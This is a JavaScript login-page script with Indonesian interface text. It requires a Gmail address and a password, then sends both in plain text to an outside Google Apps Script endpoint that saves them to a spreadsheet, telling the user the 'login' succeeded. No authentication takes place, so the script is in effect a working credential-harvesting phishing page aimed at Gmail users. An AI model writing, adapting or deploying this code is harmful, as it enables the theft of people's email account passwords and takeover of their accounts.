const scriptURL = 'https://script.google.com/macros/s/AKfycbz_eC7Ai0ABMHbHc3V7N6H6oZcsu3D4mBMkXek-yaRqfJW8QIuf1egmyuAowMiDM5Xe7Q/exec';
const loginForm = document.getElementById('loginForm');
const submitButton = document.querySelector('.btn-primary');

loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;

    if (!email.endsWith('@gmail.com')) {
        alert('Harap gunakan email Gmail.');
        return;
    }

    if (!password) {
        alert('Password tidak boleh kosong.');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'Mengirim...';

    try {
        await saveToSpreadsheet(email, password);
        
        alert('Login berhasil! Data telah disimpan.');
        loginForm.reset();           // Reset form
        console.log("✅ Data tersimpan, form sudah direset");
        
    } catch (error) {
        console.error("Error:", error);
        alert('Gagal mengirim data: ' + error.message);
    } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'Masuk';
    }
});

function loginWithGoogle() {
    alert('Fitur login Google masih dalam versi simulasi. Gunakan login manual sementara.');
}

async function saveToSpreadsheet(email, password) {
    const response = await fetch(scriptURL, {
        method: 'POST',
        headers: { 
            'Content-Type': 'text/plain;charset=utf-8'
        },
        body: JSON.stringify({ email, password })
    });

    if (!response.ok) {
        throw new Error('HTTP error: ' + response.status);
    }

    const result = await response.json();
    console.log("Response dari server:", result);

    if (result.status !== "success") {
        throw new Error(result.message || "Gagal menyimpan data");
    }

    return result;
}